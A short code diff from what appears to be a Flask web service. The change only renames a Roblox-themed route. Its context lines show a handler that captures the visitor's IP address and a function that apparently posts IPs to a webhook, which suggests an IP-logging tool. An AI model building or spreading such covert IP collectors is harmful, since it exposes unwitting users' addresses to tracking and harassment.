@@ -152,7 +152,7 @@ def send_embed(webhook_url, ip):
     except requests.RequestException:
         pass  # ignore errors
 
-@app.route("/roblox/get", methods=["GET"])
+@app.route("/roblox/v1/get", methods=["GET"])
 def roblox_get_ip():
     ip = request.headers.get("X-Forwarded-For", request.remote_addr) or "Unknown"
 
